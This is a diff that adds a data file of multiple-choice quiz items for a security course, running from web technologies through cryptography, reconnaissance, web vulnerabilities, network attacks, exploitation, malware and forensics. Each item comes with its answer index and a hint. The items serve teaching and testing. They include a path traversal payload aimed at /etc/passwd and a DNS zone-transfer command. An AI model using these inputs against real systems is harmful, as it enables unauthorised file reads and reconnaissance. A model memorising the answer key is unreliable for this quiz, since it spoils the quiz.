+            ["Ch. 13 — Web Technologies & HTTP","CORS","CORS lets servers selectively relax the same-origin policy for chosen origins.","CORS is used to do what?",["Relax the same-origin policy in a controlled way","Encrypt APIs","Block XSS automatically","Compress responses"],0,"It is a controlled exception to the browser's rule."],
+            ["Ch. 13 — Web Technologies & HTTP","Content Security Policy","CSP restricts which scripts, styles and origins a page may load.","A Content Security Policy helps mitigate what?",["XSS and injection of external scripts","SQL injection","DDoS","Port scanning"],0,"It is a browser-enforced allow-list."],
+            ["Ch. 13 — Web Technologies & HTTP","TLS Guarantees","TLS provides confidentiality and integrity for data in transit and authenticates the server.","TLS provides what?",["Confidentiality and integrity in transit","Password hashing","Disk encryption","Access control"],0,"It protects data on the wire, not at rest."],
+            ["Ch. 13 — Web Technologies & HTTP","URL Encoding","Percent-encoding represents reserved or unsafe characters, so %20 is a space.","In a URL, what does %20 represent?",["A space","A newline","An ampersand","A hash"],0,"It is the hex code for ASCII 32."],
+            ["Ch. 13 — Web Technologies & HTTP","robots.txt","robots.txt is a voluntary crawler directive and often leaks interesting paths.","robots.txt is best described as what?",["A security control","A voluntary crawler directive that can leak paths","An encryption key file","A firewall rule"],1,"Disallowed entries are an attacker's shopping list."],
+            ["Ch. 13 — Web Technologies & HTTP","JSON Web Tokens","A JWT has three dot-separated parts: header, payload and signature.","A JWT consists of how many dot-separated parts?",["2","3","4","5"],1,"Header, payload, signature."],
+            ["Ch. 13 — Web Technologies & HTTP","REST Fundamentals","REST APIs are stateless and organise functionality around resources.","REST APIs are typically what?",["Stateless and resource-oriented","Stateful and RPC-only","Binary only","SOAP-based"],0,"Each request stands alone."],
+            ["Ch. 13 — Web Technologies & HTTP","HTTP/2 Multiplexing","HTTP/2 multiplexes many requests over a single TCP connection.","A key benefit of HTTP/2 is what?",["Multiplexing many requests over one connection","Removing TLS","Replacing DNS","Stateless cookies"],0,"It solved head-of-line blocking at the application layer."],
+            ["Ch. 13 — Web Technologies & HTTP","Web Cache Deception","Cache deception tricks a cache into storing a private page and serving it to others.","Web cache deception attacks trick a cache into doing what?",["Storing a private page and serving it to others","Deleting cookies","Downgrading TLS","Blocking bots"],0,"Attackers append cacheable-looking paths to private URLs."],
+
+            ["Ch. 14 — Cryptography","Symmetric Encryption","Symmetric ciphers use a single shared secret key for both encryption and decryption.","Symmetric encryption uses what?",["One shared key","A public and private key pair","No key at all","A hash"],0,"One key to lock and unlock."],
+            ["Ch. 14 — Cryptography","Asymmetric Encryption","Asymmetric cryptography uses a mathematically related public and private key pair.","Asymmetric encryption uses what?",["One shared secret","A mathematically related key pair","A salt","A nonce only"],1,"What one key locks, the other unlocks."],
+            ["Ch. 14 — Cryptography","AES","AES is a symmetric block cipher operating on 128-bit blocks.","AES is an example of what?",["A symmetric block cipher","An asymmetric cipher","A hash function","A stream protocol"],0,"It replaced DES as the standard."],
+            ["Ch. 14 — Cryptography","RSA","RSA is the classic asymmetric algorithm built on the difficulty of factoring large primes.","RSA is an example of what?",["Symmetric encryption","Asymmetric encryption","Hashing","Encoding"],1,"It is used for key exchange and signatures."],
+            ["Ch. 14 — Cryptography","Hash Functions","Cryptographic hashes are one-way functions that produce a fixed-length digest.","Cryptographic hash functions are what?",["Reversible","One-way","Key-based only","Compression algorithms"],1,"You cannot get the input back from the digest."],
+            ["Ch. 14 — Cryptography","MD5 Weakness","MD5 is broken because practical collisions can be generated.","MD5 is considered unsafe because of what?",["It is too slow","Collisions can be generated","It is asymmetric","It uses 512-bit keys"],1,"Two different inputs can produce the same digest."],
+            ["Ch. 14 — Cryptography","Salting Passwords","A unique random salt per password defeats precomputed rainbow tables.","A password salt defends against what?",["Rainbow tables and precomputed hashes","SQL injection","DDoS","Phishing"],0,"Same password, different hash every time."],
+            ["Ch. 14 — Cryptography","HMAC","An HMAC combines a hash function with a shared key to prove integrity and authenticity.","An HMAC provides what?",["Integrity and authenticity using a shared key","Confidentiality only","Compression","Randomness"],0,"It proves the message came from someone holding the key."],
+            ["Ch. 14 — Cryptography","Digital Signatures","A digital signature is produced with the sender's private key and verified with the public key.","A digital signature is created with which key?",["The sender's private key","The sender's public key","A shared secret","A salt"],0,"Only the owner can sign; anyone can verify."],
+            ["Ch. 14 — Cryptography","Certificates and CAs","A certificate binds a public key to an identity and is signed by a trusted Certificate Authority.","A digital certificate is signed by whom?",["The website owner","A trusted Certificate Authority","The browser vendor","The ISP"],1,"That signature is why your browser trusts it."],
+            ["Ch. 14 — Cryptography","Diffie-Hellman","Diffie-Hellman lets two parties derive a shared secret over an insecure channel.","Diffie-Hellman allows two parties to do what?",["Agree on a shared secret over an insecure channel","Exchange passwords securely","Sign documents","Hash files"],0,"They never send the secret itself."],
+            ["Ch. 14 — Cryptography","Encoding is Not Encryption","Base64 is a reversible encoding that provides no confidentiality whatsoever.","Base64 is best described as what?",["An encoding, not encryption","A cipher","A hash","A key exchange"],0,"Anyone can decode it in one line."],
+            ["Ch. 14 — Cryptography","Rainbow Tables","A rainbow table is a precomputed mapping of hashes back to plaintext.","What is a rainbow table?",["A precomputed mapping of hashes to plaintext","A firewall ruleset","A wireless attack","A TLS cipher suite"],0,"Salts and slow hashes ruin them."],
+            ["Ch. 14 — Cryptography","Password Hashing Algorithms","bcrypt and Argon2 are deliberately slow and memory-hard to resist cracking.","Why are bcrypt and Argon2 preferred for passwords?",["They are deliberately slow and memory-hard","They are reversible","They use no salt","They compress data"],0,"Slowness is the whole point."],
+            ["Ch. 14 — Cryptography","Nonces and IVs","A nonce or IV must never be reused with the same key in a stream or block mode.","An IV or nonce must never be what?",["Random","Reused with the same key","Public","Generated per message"],1,"Reuse leaks relationships between plaintexts."],
+            ["Ch. 14 — Cryptography","Steganography","Steganography hides the existence of a message rather than its contents.","Steganography differs from encryption because it does what?",["Hides the existence of a message","Makes data unreadable","Uses RSA","Requires a key"],0,"The goal is to avoid suspicion entirely."],
+            ["Ch. 14 — Cryptography","Classical Ciphers","The Caesar cipher shifts each letter by a fixed amount, a simple substitution.","The Caesar cipher is a form of what?",["Substitution cipher","Block cipher","Hash function","Stream cipher"],0,"Rotate the alphabet by three."],
+            ["Ch. 14 — Cryptography","Perfect Forward Secrecy","PFS ensures past sessions stay safe even if the long-term key is later compromised.","Perfect Forward Secrecy ensures what?",["Past sessions stay safe if the long-term key leaks","Passwords are hashed","Keys never expire","Hashes are salted"],0,"Ephemeral keys are thrown away after use."],
+            ["Ch. 14 — Cryptography","XOR in Crypto","XOR is used everywhere because it is cheap and is its own inverse.","XOR is common in cryptography because it is what?",["Its own inverse and cheap to compute","A hash function","Asymmetric","Slow"],0,"A XOR B XOR B gives back A."],
+            ["Ch. 14 — Cryptography","Key Length","Longer keys raise the cost of brute-force attacks exponentially.","Increasing key length primarily does what?",["Increases brute-force cost","Adds compression","Prevents phishing","Removes the need for salts"],0,"Each extra bit doubles the search space."],
+
+            ["Ch. 15 — Reconnaissance & OSINT","Passive vs Active Recon","Passive recon gathers information without touching the target directly.","Which of these is passive reconnaissance?",["Port scanning a host","Reading public WHOIS records","Sending crafted packets","Brute-forcing logins"],1,"If the target sees you, it was not passive."],
+            ["Ch. 15 — Reconnaissance & OSINT","WHOIS","WHOIS returns registration details such as registrar, dates and sometimes contacts.","What does WHOIS provide?",["Domain registration details","Open ports","Password hashes","DNS zone files"],0,"It is the public ownership record."],
+            ["Ch. 15 — Reconnaissance & OSINT","dig and nslookup","dig queries DNS records directly and is a staple of recon.","Which tool queries DNS records directly?",["ping","dig","curl","netcat"],1,"It speaks DNS natively."],
+            ["Ch. 15 — Reconnaissance & OSINT","Shodan","Shodan indexes internet-connected devices and their exposed services.","Shodan is best described as what?",["A search engine for internet-connected devices","A password manager","A VPN","A SIEM"],0,"It is the search engine for banners."],
+            ["Ch. 15 — Reconnaissance & OSINT","Google Dorks","Dorks combine advanced search operators to surface exposed files and panels.","Google dorks are what?",["Advanced search operators that surface exposed data","Malicious browser extensions","Encrypted search queries","SEO tools"],0,"filetype and inurl are your friends."],
+            ["Ch. 15 — Reconnaissance & OSINT","Subdomain Enumeration","Forgotten subdomains often run unmonitored, unpatched services.","Subdomain enumeration helps an attacker do what?",["Discover forgotten or unmonitored services","Encrypt traffic","Patch servers","Block scans"],0,"Dev, staging and old portals are prime targets."],
+            ["Ch. 15 — Reconnaissance & OSINT","Certificate Transparency","CT logs publicly record issued certificates, revealing internal hostnames.","Certificate Transparency logs are useful because they do what?",["Record issued certificates, revealing subdomains","Store passwords","Log firewall denies","Encrypt DNS"],0,"Every publicly trusted cert is logged."],
+            ["Ch. 15 — Reconnaissance & OSINT","Wayback Machine","Historical snapshots can reveal old pages, endpoints and technologies.","The Wayback Machine is useful in recon to do what?",["View historical versions of a site","Crack hashes","Scan ports","Decrypt TLS"],0,"The internet never really forgets."],
+            ["Ch. 15 — Reconnaissance & OSINT","Document Metadata","Metadata in documents can leak usernames, software versions and internal paths.","Which tool extracts metadata from documents?",["exiftool","nmap","hashcat","gobuster"],0,"Always check the file's hidden properties."],
+            ["Ch. 15 — Reconnaissance & OSINT","DNS Zone Transfer","dig axfr asks an authoritative server to dump the entire zone.","A DNS zone transfer is performed with which command?",["dig axfr @ns domain","nmap -sV","curl -I","whois"],0,"It asks the server to spill everything."],
+            ["Ch. 15 — Reconnaissance & OSINT","Nmap SYN Scan","nmap -sS performs a half-open SYN scan that is fast and relatively quiet.","What is an nmap -sS scan?",["A TCP SYN half-open scan","A UDP scan","A ping sweep","An OS fingerprint"],0,"It never completes the handshake."],
+            ["Ch. 15 — Reconnaissance & OSINT","Banner Grabbing","Banners reveal service names and versions that map to known CVEs.","Banner grabbing reveals what?",["Service versions that may be vulnerable","Passwords","User emails","Firewall rules"],0,"Version strings are gold during recon."],
+            ["Ch. 15 — Reconnaissance & OSINT","theHarvester","theHarvester collects emails, subdomains and names from public sources.","theHarvester collects what?",["Emails, subdomains and names from public sources","Hashes","Packets","Registry keys"],0,"It is a one-stop OSINT harvester."],
+            ["Ch. 15 — Reconnaissance & OSINT","Social Media OSINT","Public profiles reveal employees, technology stacks and organisational structure.","Social media is valuable in recon because it does what?",["Reveals employees, technologies and org structure","Encrypts data","Blocks phishing","Provides backups"],0,"People post more than they should."],
+            ["Ch. 15 — Reconnaissance & OSINT","Legality of OSINT","Public data can still be illegal to collect or use depending on jurisdiction and terms.","Which statement about OSINT is correct?",["Public data is always legal to use in any context","Collection must still respect laws, terms of service and scope","OSINT requires no authorization ever","OSINT is illegal"],1,"Public does not automatically mean permitted."],
+            ["Ch. 15 — Reconnaissance & OSINT","Detecting Scans","Defenders spot scans through repeated denied connections from one source.","How do defenders commonly detect port scans?",["Firewall and IDS logs of many denied connections from one source","Disk usage spikes","DNS caching","Password resets"],0,"Volume plus repetition equals a signature."],
+
+            ["Ch. 16 — Web Application Vulnerabilities","SQL Injection Cause","SQLi happens when untrusted input is concatenated directly into a query.","SQL injection occurs when what happens?",["User input is concatenated into a query without parameterization","TLS is missing","Cookies are encrypted","The server is patched"],0,"The database cannot tell code from data."],
+            ["Ch. 16 — Web Application Vulnerabilities","Fixing SQL Injection","Parameterized queries keep user data out of the query structure entirely.","The most reliable fix for SQL injection is what?",["Parameterized queries and prepared statements","Hiding error messages","Renaming tables","Using HTTP/2"],0,"Separate the code from the data."],
+            ["Ch. 16 — Web Application Vulnerabilities","Blind SQL Injection","In blind SQLi no data is returned directly, so the attacker infers it from behaviour.","Blind SQL injection means what?",["No data is returned directly and the attacker infers it from behaviour","The database is offline","The attacker is blindfolded","Only SELECT statements work"],0,"True or false questions against the database."],
+            ["Ch. 16 — Web Application Vulnerabilities","Stored XSS","Stored XSS persists server-side and fires for every user who views the page.","Stored XSS is dangerous because of what?",["The payload persists and executes for every viewer","It only affects the attacker","It requires physical access","It cannot be filtered"],0,"One injection, many victims."],
+            ["Ch. 16 — Web Application Vulnerabilities","Reflected XSS","Reflected XSS arrives through a crafted link that echoes the payload back.","Reflected XSS typically arrives via what?",["A crafted link containing the payload","A database record","A file upload","A DNS record"],0,"The server bounces the payload off the victim."],
+            ["Ch. 16 — Web Application Vulnerabilities","DOM XSS","DOM-based XSS executes entirely in the browser through client-side JavaScript.","DOM-based XSS executes where?",["Entirely in the browser via client-side JavaScript","On the server","In the database","In the WAF"],0,"The server never sees the payload."],
+            ["Ch. 16 — Web Application Vulnerabilities","XSS Defence","Context-aware output encoding is the primary defence against XSS.","The primary defence against XSS is what?",["Context-aware output encoding","Input length limits","HTTPS","Rate limiting"],0,"Encode for the exact context you output into."],
+            ["Ch. 16 — Web Application Vulnerabilities","CSRF","Cross-site request forgery abuses the victim's already-authenticated browser session.","CSRF attacks abuse what?",["The victim's authenticated browser session","Weak passwords","Open ports","Unpatched kernels"],0,"The browser helpfully attaches the cookie."],
+            ["Ch. 16 — Web Application Vulnerabilities","Anti-CSRF Tokens","A per-request token works because the attacker cannot read it from the victim's page.","A CSRF token works because of what?",["The attacker cannot read the unpredictable token from the victim's page","It encrypts the request","It blocks bots","It hashes passwords"],0,"Same-origin policy stops the attacker reading it."],
+            ["Ch. 16 — Web Application Vulnerabilities","SSRF","Server-side request forgery makes the server issue requests on the attacker's behalf.","SSRF lets an attacker do what?",["Make the server issue requests to internal systems","Steal cookies via JavaScript","Crack hashes","Spoof DNS"],0,"The server becomes your proxy into the internal network."],
+            ["Ch. 16 — Web Application Vulnerabilities","XXE","XML external entity flaws let parsers resolve attacker-controlled entities.","XXE vulnerabilities arise from what?",["Unsafe parsing of XML external entities","Weak TLS","Long passwords","Missing cookies"],0,"An old parser feature turned weapon."],
+            ["Ch. 16 — Web Application Vulnerabilities","IDOR","Insecure direct object reference means IDs are used without an authorization check.","IDOR occurs when what happens?",["Object references are exposed without authorization checks","IDs are encrypted","Users share accounts","Sessions expire"],0,"Change the number, get someone else's data."],
+            ["Ch. 16 — Web Application Vulnerabilities","Command Injection","Unsanitized input passed to a shell lets attackers run operating system commands.","Command injection allows what?",["Execution of OS commands through unsanitized input","Reading cookies","Bypassing TLS","Rewriting DNS"],0,"The app shell becomes your shell."],
+            ["Ch. 16 — Web Application Vulnerabilities","Local File Inclusion","LFI tricks the application into reading files from the server filesystem.","Local File Inclusion lets an attacker do what?",["Read files on the server through the web app","Upload executables","Bypass MFA","Decrypt hashes"],0,"Follow the include path out of the webroot."],
+            ["Ch. 16 — Web Application Vulnerabilities","Path Traversal","Dotted sequences climb out of the intended directory into parent folders.","Which payload is a classic path traversal attempt?",["../../../../etc/passwd","SELECT * FROM users","script alert payload","quote OR 1=1 comment"],0,"Each pair climbs one directory."],
+            ["Ch. 16 — Web Application Vulnerabilities","Insecure Deserialization","Attacker-controlled serialized data can be turned into code execution.","Insecure deserialization is dangerous because of what?",["Attacker-controlled data can become code execution","It uses too much CPU","It breaks JSON","It needs admin rights"],0,"Objects reconstructed with attacker intent."],
+            ["Ch. 16 — Web Application Vulnerabilities","SSTI","Server-side template injection can escalate from rendering quirks to remote code execution.","Server-side template injection can lead to what?",["Remote code execution","Only cosmetic changes","Faster rendering","Better SEO"],0,"Templates can call into the host language."],
+            ["Ch. 16 — Web Application Vulnerabilities","Open Redirects","Open redirects are chained into phishing and OAuth token theft.","Open redirects are commonly abused for what?",["Phishing and OAuth token theft","Disk encryption","Load balancing","Caching"],0,"A trusted domain lends its reputation."],
+            ["Ch. 16 — Web Application Vulnerabilities","Broken Access Control","Broken access control tops the OWASP Top 10 for 2021.","Which category tops the OWASP Top 10 of 2021?",["Broken Access Control","SQL Injection","Cross-Site Scripting","CSRF"],0,"It is the most common and most damaging class."],
+            ["Ch. 16 — Web Application Vulnerabilities","Clickjacking","Clickjacking is stopped by X-Frame-Options or a frame-ancestors CSP directive.","Clickjacking is mitigated by what?",["X-Frame-Options or frame-ancestors CSP","HTTPS","Strong passwords","Input validation"],0,"Stop your pages being framed."],
+            ["Ch. 16 — Web Application Vulnerabilities","Unrestricted File Upload","Uploads should be validated, renamed and stored outside the web root.","The safest way to handle uploads is to do what?",["Validate type, rename files and store outside the webroot","Trust the file extension","Allow all MIME types","Store in the webroot"],0,"An uploaded shell is instant code execution."],
+            ["Ch. 16 — Web Application Vulnerabilities","Rate Limiting","Rate limiting on authentication endpoints blunts credential stuffing and brute force.","Rate limiting on login endpoints primarily stops what?",["Credential stuffing and brute force","XSS","SSRF","Clickjacking"],0,"It makes guessing expensive."],
+
+            ["Ch. 17 — Network Attacks & Defenses","Man-in-the-Middle","A MITM sits between two parties, relaying and often altering their traffic.","A man-in-the-middle attack allows the attacker to do what?",["Intercept and alter traffic between two parties","Only read encrypted files","Crash the server","Reset passwords"],0,"You become the router nobody asked for."],
+            ["Ch. 17 — Network Attacks & Defenses","ARP Spoofing","ARP has no authentication, so forged replies are accepted by default.","ARP spoofing works because ARP does what?",["Has no authentication","Uses TLS","Is encrypted","Requires a router"],0,"Anyone can answer the question."],
+            ["Ch. 17 — Network Attacks & Defenses","DNS Spoofing","Forged DNS answers redirect victims to attacker-controlled infrastructure.","DNS spoofing redirects victims by doing what?",["Returning forged DNS answers","Blocking port 53","Editing hosts files remotely","Crashing resolvers"],0,"Lie about where the name points."],
+            ["Ch. 17 — Network Attacks & Defenses","DoS vs DDoS","A DDoS uses many distributed sources, while a DoS comes from one.","What is the main difference between DoS and DDoS?",["DDoS uses many distributed sources","DoS is illegal","DDoS needs no network","DoS only targets websites"],0,"Distribution is what makes it hard to block."],
+            ["Ch. 17 — Network Attacks & Defenses","SYN Floods","A SYN flood fills the server's half-open connection table with incomplete handshakes.","A SYN flood exhausts what?",["The server's half-open connection table","Disk space","CPU cache","DNS records"],0,"Never finish the handshake."],
+            ["Ch. 17 — Network Attacks & Defenses","Session Hijacking","Stealing a session cookie or token lets an attacker assume the victim's identity.","Session hijacking typically involves stealing what?",["A session cookie or token","A password hash","A TLS certificate","A MAC address"],0,"The session is the identity."],
+            ["Ch. 17 — Network Attacks & Defenses","Replay Attacks","A captured valid message is retransmitted later to be accepted again.","A replay attack succeeds when what happens?",["Captured valid traffic is retransmitted later","Encryption is strong","Nonces are random","Timestamps are checked"],0,"Freshness checks are the defence."],
+            ["Ch. 17 — Network Attacks & Defenses","Rogue Access Points","An unauthorised AP plugged into the corporate network bypasses perimeter controls.","A rogue access point is what?",["An unauthorised AP on the network","A failed firewall","A DNS server","A backup router"],0,"A cheap router becomes a back door."],
+            ["Ch. 17 — Network Attacks & Defenses","Evil Twin","An evil twin mimics a legitimate SSID to harvest credentials from joiners.","An evil twin attack uses what?",["A fake AP mimicking a legitimate SSID","A cloned hard drive","A duplicated certificate","A forged email"],0,"The name looks right, everything else is yours."],
+            ["Ch. 17 — Network Attacks & Defenses","Packet Sniffing","Sniffing works on hubs and on switched ports that are mirrored or SPANned.","Passive sniffing is possible on what?",["A hub or a mirrored/SPAN port","Switched encrypted networks only","TLS sessions","Air-gapped hosts"],0,"The wire must deliver traffic to your NIC."],
+            ["Ch. 17 — Network Attacks & Defenses","Wireshark","Wireshark captures and dissects packets for analysis and troubleshooting.","Wireshark is used for what?",["Capturing and analysing network packets","Hashing passwords","Scanning ports","Editing firewall rules"],0,"It is the packet microscope."],
+            ["Ch. 17 — Network Attacks & Defenses","Stateful Firewalls","Stateful firewalls track connection state and allow legitimate return traffic.","A stateful firewall does what?",["Tracks connection state to allow return traffic","Inspects only headers","Cannot block ports","Replaces an IDS"],0,"It remembers who started the conversation."],
+            ["Ch. 17 — Network Attacks & Defenses","IDS vs IPS","An IPS sits inline and can block, while an IDS only detects and alerts.","What is the difference between IDS and IPS?",["IPS can block traffic inline while IDS only alerts","IDS is hardware","IPS is passive","They are identical"],0,"One shouts, the other acts."],
+            ["Ch. 17 — Network Attacks & Defenses","VLAN Hopping","VLAN hopping lets an attacker send traffic into a VLAN they do not belong to.","VLAN hopping allows an attacker to do what?",["Send traffic into another VLAN","Encrypt VLAN tags","Disable spanning tree","Steal Wi-Fi keys"],0,"Double tagging and switch spoofing are the classics."],
+            ["Ch. 17 — Network Attacks & Defenses","Port Knocking","Port knocking hides a service until a secret sequence of connection attempts is made.","Port knocking is what?",["A technique to hide services until a secret sequence is sent","A DoS attack","A scanning tool","A cipher"],0,"The door only exists if you knock correctly."],
+            ["Ch. 17 — Network Attacks & Defenses","Network Access Control","NAC checks device posture before allowing a device onto the network.","What does Network Access Control do?",["Enforces device posture before granting network access","Encrypts DNS","Blocks phishing emails","Backs up servers"],0,"No patch, no port."],
+
+            ["Ch. 18 — Exploitation & Post-Exploitation","Exploit vs Payload","The exploit delivers the payload, and the payload is what actually runs.","An exploit is what?",["The code that takes advantage of a vulnerability","The code that runs after","A firewall rule","A scan report"],0,"It is the delivery mechanism."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Reverse Shells","In a reverse shell the target connects back out to the attacker's listener.","In a reverse shell, what happens?",["The target connects back to the attacker","The attacker connects to a listening target","No shell is spawned","Only UDP is used"],0,"Outbound traffic usually gets through."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Bind Shells","In a bind shell the target listens and the attacker connects inward.","In a bind shell the target does what?",["Listens on a port and the attacker connects to it","Connects out to the attacker","Uses DNS tunnelling","Requires no port"],0,"The shell waits for you."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Metasploit Console","msfconsole is the primary interactive interface for the Metasploit Framework.","Which Metasploit component is the main interactive console?",["msfvenom","msfconsole","armitage only","meterpreter"],1,"It is where you search, use and run modules."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Meterpreter","Meterpreter is an advanced in-memory payload offering post-exploitation tooling.","Meterpreter is what?",["An in-memory advanced payload","A port scanner","A hash cracker","A firewall"],0,"It lives in memory, not on disk."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Vertical Privilege Escalation","Vertical escalation means gaining higher privileges than you currently hold.","Vertical privilege escalation means what?",["Gaining higher privileges than you currently have","Moving to another user with equal rights","Moving between hosts","Escalating across subnets"],0,"Up the ladder, not sideways."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Lateral Movement","Lateral movement spreads the compromise from one host to others.","Lateral movement is what?",["Moving from one compromised host to others","Escalating on one host","Deleting logs","Encrypting files"],0,"One machine is rarely the goal."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Persistence","Persistence mechanisms keep access alive across reboots and password changes.","Persistence ensures what?",["Access survives reboots and credential changes","Faster exploitation","Encrypted traffic","Cleaner logs"],0,"Scheduled tasks, services and run keys."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Data Exfiltration","DNS is a favourite exfiltration channel because it is rarely blocked.","Data exfiltration over DNS is popular because of what?",["DNS is rarely blocked and blends with normal traffic","It is the fastest channel","It encrypts data","It bypasses TLS"],0,"Every network needs a resolver."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Pivoting","Pivoting routes traffic through a compromised host into otherwise unreachable networks.","Pivoting allows an attacker to do what?",["Route traffic through a compromised host into other networks","Escalate locally","Crack hashes","Spoof email"],0,"The victim becomes your router."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Credential Dumping","Credential dumping harvests secrets from memory and credential stores.","Credential dumping targets what?",["Memory and stores holding secrets","Firewall rules","DNS zones","Backup tapes"],0,"LSASS, SAM and cached credentials."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Rootkits","A rootkit hides the attacker's presence while maintaining privileged access.","A rootkit's main goal is what?",["To hide the attacker's presence and maintain privileged access","To encrypt files","To mine cryptocurrency only","To send spam"],0,"Stealth is the product."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Command and Control","C2 infrastructure delivers instructions to implants and receives exfiltrated data.","Command and Control infrastructure is used to do what?",["Send instructions to and receive data from implants","Scan ports","Host websites","Crack passwords"],0,"It is the puppet string."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Living off the Land","LOTL uses built-in OS tools so malicious activity blends with administration.","Living off the land means what?",["Using built-in OS tools to avoid detection","Writing custom malware","Disabling antivirus","Using only exploits"],0,"Why bring tools when the OS has them?"],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Covering Tracks","Clearing event logs is a classic anti-forensic technique.","Which action is a classic anti-forensic technique?",["Clearing event logs","Enabling auditd","Rotating passwords","Patching systems"],0,"No logs, no timeline."],
+            ["Ch. 18 — Exploitation & Post-Exploitation","Authorization","Never test any system without explicit written authorization and a defined scope.","Before testing any system you must always do what?",["Obtain written authorization and defined scope","Notify the FBI","Disable the firewall","Use a VPN"],0,"No permission, no testing. Period."],
+
+            ["Ch. 19 — Malware & Reverse Engineering","Viruses","A virus needs a host file or user action in order to spread.","A virus differs from a worm because it does what?",["Requires a host file or user action to spread","Self-propagates over networks","Only affects Linux","Is always fileless"],0,"It needs a carrier."],
+            ["Ch. 19 — Malware & Reverse Engineering","Worms","A worm self-propagates across networks without any user interaction.","A worm's defining trait is what?",["Self-propagation without user interaction","Needing a host program","Encrypting files","Stealing cookies"],0,"It spreads itself, fast."],
+            ["Ch. 19 — Malware & Reverse Engineering","Trojans","A trojan disguises itself as legitimate software to get executed.","A trojan is malware that does what?",["Disguises itself as legitimate software","Replicates through email only","Encrypts disks","Modifies the boot sector"],0,"The gift that is not a gift."],
+            ["Ch. 19 — Malware & Reverse Engineering","Ransomware","Ransomware encrypts data and demands payment for the decryption key.","Ransomware primarily does what?",["Encrypts data and demands payment","Mines cryptocurrency","Steals cookies","Floods networks"],0,"Availability is the target."],
+            ["Ch. 19 — Malware & Reverse Engineering","Bootkits","A bootkit modifies the boot process so it loads before the operating system.","Which malware type modifies the boot process to load before the OS?",["Bootkit","Adware","Spyware","Dialer"],0,"It gets there first."],
+            ["Ch. 19 — Malware & Reverse Engineering","Keyloggers","Keyloggers record keystrokes to capture credentials and messages.","A keylogger records what?",["Keystrokes","Network packets","Disk images","Browser history only"],0,"Everything you type."],
+            ["Ch. 19 — Malware & Reverse Engineering","Spyware","Spyware covertly collects information about the user without consent.","Spyware is designed to do what?",["Covertly collect user information","Encrypt files","Display ads","Flood networks"],0,"Surveillance as software."],
+            ["Ch. 19 — Malware & Reverse Engineering","Fileless Malware","Fileless malware lives in memory and abuses legitimate tools, leaving little on disk.","Fileless malware is hard to detect because of what?",["It lives in memory and uses legitimate tools","It is encrypted on disk","It is small","It only runs at boot"],0,"Nothing to scan if nothing is written."],
+            ["Ch. 19 — Malware & Reverse Engineering","Polymorphic Malware","Polymorphic malware mutates its own code so signatures never stay valid.","Polymorphic malware does what?",["Changes its code signature each infection","Never changes","Only targets servers","Uses no code"],0,"A moving target for AV."],
+            ["Ch. 19 — Malware & Reverse Engineering","Packers","Packers compress and obfuscate executables to frustrate static analysis.","A packer is used to do what?",["Compress and obfuscate an executable to hinder analysis","Sign code","Encrypt disks","Manage updates"],0,"Unpacking is step one for the analyst."],
+            ["Ch. 19 — Malware & Reverse Engineering","Sandbox Isolation","Sandboxes must be isolated with no route to the real network.","Malware sandboxes must do what?",["Be isolated with no real network access","Run on production hosts","Have internet access","Disable logging"],0,"Fake internet, real containment."],
+            ["Ch. 19 — Malware & Reverse Engineering","The strings Utility","strings extracts readable text such as URLs, paths and messages from a binary.","The strings utility is used in static analysis to do what?",["Extract readable text from a binary","Disassemble code","Debug processes","Encrypt binaries"],0,"Cheapest intel you will ever get."],
+            ["Ch. 19 — Malware & Reverse Engineering","Disassemblers vs Debuggers","A debugger adds execution control, breakpoints and memory inspection.","A debugger differs from a disassembler because it does what?",["Allows execution control, breakpoints and memory inspection","Only reads bytes","Cannot run code","Works only on source"],0,"One reads, the other drives."],
+            ["Ch. 19 — Malware & Reverse Engineering","YARA Rules","YARA rules describe malware families by textual and binary patterns.","YARA rules are used to do what?",["Identify and classify malware by patterns","Crack passwords","Scan ports","Encrypt files"],0,"Pattern matching for malware hunting."],
+            ["Ch. 19 — Malware & Reverse Engineering","Indicators of Compromise","An IOC is an observable artefact suggesting a possible compromise.","An IOC is what?",["An observable artefact indicating possible compromise","A type of malware","An encryption key","A firewall rule"],0,"Hashes, IPs, domains, registry keys."],
+            ["Ch. 19 — Malware & Reverse Engineering","Droppers and Loaders","A dropper delivers and installs the main payload, often in stages.","A dropper's job is to do what?",["Deliver and install the main payload","Encrypt files","Steal data","Hide in the kernel"],0,"Stage one brings stage two."],
+
+            ["Ch. 20 — Digital Forensics & IR","Chain of Custody","Chain of custody records who handled evidence, when and how.","Chain of custody documents what?",["Who handled evidence, when and how","The malware code","The firewall rules","The network diagram"],0,"Break it and the evidence is worthless in court."],
+            ["Ch. 20 — Digital Forensics & IR","Order of Volatility","Collect the most volatile evidence first, starting with CPU registers and RAM.","Which evidence should be collected first?",["CPU registers and RAM","Backup tapes","Archived emails","Printed logs"],0,"What disappears fastest goes first."],
+            ["Ch. 20 — Digital Forensics & IR","Write Blockers","A write blocker prevents any modification of evidence during acquisition.","A write blocker prevents what?",["Modification of evidence during acquisition","Network access","Malware execution","Log deletion"],0,"Read only, always."],
+            ["Ch. 20 — Digital Forensics & IR","Forensic Imaging","A forensic image is a bit-for-bit copy of the original storage media.","A forensic image is what?",["A bit-for-bit copy of storage media","A screenshot","A ZIP of documents","A memory dump only"],0,"Every bit, including deleted data."],
+            ["Ch. 20 — Digital Forensics & IR","Hashing Evidence","Comparing hashes before and after proves the evidence was not altered.","Hashing evidence proves what?",["Integrity and that it has not changed","Ownership","Legality","Encryption"],0,"Same hash means same bytes."],
+            ["Ch. 20 — Digital Forensics & IR","Volatility","Volatility is the standard framework for analysing memory images.","Volatility is used for what?",["Memory forensics","Disk partitioning","Password cracking","Packet capture"],0,"Running processes, connections, injected code."],
+            ["Ch. 20 — Digital Forensics & IR","File Carving","Carving recovers files from raw data using headers and footers, without metadata.","File carving recovers what?",["Deleted files from raw data without filesystem metadata","Encrypted keys","Network routes","Registry keys"],0,"Signatures survive deletion."],
